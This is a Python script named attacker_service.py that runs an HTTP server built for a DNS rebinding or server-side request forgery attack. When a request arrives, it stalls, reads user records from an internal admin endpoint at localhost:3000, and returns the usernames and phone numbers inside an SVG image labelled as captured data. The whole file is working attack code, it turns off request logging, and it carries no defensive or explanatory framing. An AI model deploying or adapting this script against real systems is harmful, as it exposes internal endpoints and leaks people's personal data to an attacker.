#!/usr/bin/env python3
# attacker_service.py

from http.server import HTTPServer, BaseHTTPRequestHandler
import time
import urllib.request
import json
from datetime import datetime


class RealAdminHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print("\n=== REAL ADMIN FETCH ===")
        print(f"Request from: {self.client_address[0]}")
        print(f"Path: {self.path}")

        # Stall for DNS rebinding timing
        print("Stalling 2 seconds for DNS rebinding timing...")
        time.sleep(2)

        try:
            print("Fetching REAL data from http://localhost:3000/internal/admin...")

            with urllib.request.urlopen(
                "http://localhost:3000/internal/admin",
                timeout=5
            ) as response:
                raw_data = response.read()
                real_users = json.loads(raw_data.decode())

            print(f"SUCCESS! Got {len(real_users)} real user records")

            svg = self.create_svg(real_users)

            self.send_response(200)
            self.send_header("Content-Type", "image/svg+xml")
            self.end_headers()
            self.wfile.write(svg.encode())

            print("SVG with REAL data served")

        except Exception as e:
            print(f"ERROR: {e}")

            self.send_response(200)
            self.send_header("Content-Type", "image/svg+xml")
            self.end_headers()
            self.wfile.write(
                b'<?xml version="1.0"?><svg><text>Error fetching data</text></svg>'
            )

    def create_svg(self, users):
        svg = f'''<?xml version="1.0"?>
<svg width="600" height="400" xmlns="http://www.w3.org/2000/svg">
<rect width="100%" height="100%" fill="#f0f0f0"/>
<text x="300" y="30" text-anchor="middle"
      font-family="monospace" font-size="14">
DNS REBINDING - REAL ADMIN DATA CAPTURED
</text>
<text x="300" y="60" text-anchor="middle"
      font-family="monospace" font-size="12">
From: /internal/admin | Time: {datetime.now().strftime("%H:%M:%S")}
</text>
<text x="20" y="100" font-family="monospace"
      font-size="12" font-weight="bold">
REAL USER DATA FROM YOUR DATABASE:
</text>
'''

        for i, user in enumerate(users):
            y = 130 + i * 25
            svg += (
                f'<text x="40" y="{y}" '
                f'font-family="monospace" font-size="11">'
                f'â€¢ {user["username"]}: {user["phone"]}'
                f'</text>\n'
            )

        svg += "</svg>"
        return svg

    def log_message(self, format, *args):
        # Disable default HTTP logging
        pass


print("=" * 60)
print("REAL ADMIN DATA CAPTURE SERVICE")
print("=" * 60)
print("Running on: 10.0.2.15:9999")
print("Will fetch REAL data from: http://localhost:3000/internal/admin")
print("=" * 60)

server = HTTPServer(("10.0.2.15", 9999), RealAdminHandler)
server.serve_forever()
